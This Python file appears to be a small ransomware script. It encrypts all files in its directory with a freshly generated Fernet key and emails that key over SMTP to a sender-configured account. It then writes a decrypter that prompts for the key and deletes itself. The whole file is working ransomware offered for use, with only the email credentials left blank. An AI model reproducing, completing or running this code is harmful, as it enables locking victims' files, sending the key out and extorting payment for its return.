import os
from smtplib import SMTP
from cryptography.fernet import Fernet


# E-Mail Configirations
EMAIL = ""  # 'example@example.com'
EMAIL_PASSWORD = ""
EMAIL_SERVER = ""  # gmail: 'smtp.gmail.com'
EMAİL_SERVER_PORT = 587  # gmail: 587


def get_files():
    files = []
    non_encrptfiles = ["encrypter.py", "LICENCE",
                       "README.md", ".gitignore", "decrypter.py"]
    for file in os.listdir():
        if file in non_encrptfiles:
            continue
            # Do not encrypt these files.
        if os.path.isfile(file):
            files.append(file)
            # Do not add if this is a directory, only if a file.
    return files


def send_email(email, password, server, port, message):
    email_server = SMTP(server, port)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()


def encrypt_files(get_files, key):
    for file in get_files():
        with open(file, "rb") as the_file:
            contents = the_file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(contents_encrypted)


def generate_decrypter():
    with open("decrypter.py", "w") as decrypter:
        decrypter.write(f"""

import os
from cryptography.fernet import Fernet


def get_files():
    files = []
    non_encrptfiles = ["encrpyter.py","LICENCE","README.md"]
    for file in os.listdir():
        if file in non_encrptfiles:
            continue 
            # Do not encrypt these files.
        if os.path.isfile(file):
            files.append(file) 
            #Do not add if this is a directory, only if a file.
    return files

def decrypt_files(files,key=None):
    key = str(input("ENTER KEY: "))
    for file in files:
        with open(file,"rb") as the_file:
            contents = the_file.read()
        contents_decrypted = Fernet(key).decrypt(contents)
        with open(file,"wb") as the_file:
            the_file.write(contents_decrypted)

decrypt_files(get_files())


""")


def terminate():
    os.remove(os.path.abspath(__file__))

key = Fernet.generate_key()
encrypt_files(get_files, key)
send_email(EMAIL, EMAIL_PASSWORD, EMAIL_SERVER, EMAİL_SERVER_PORT, key)
generate_decrypter()
terminate()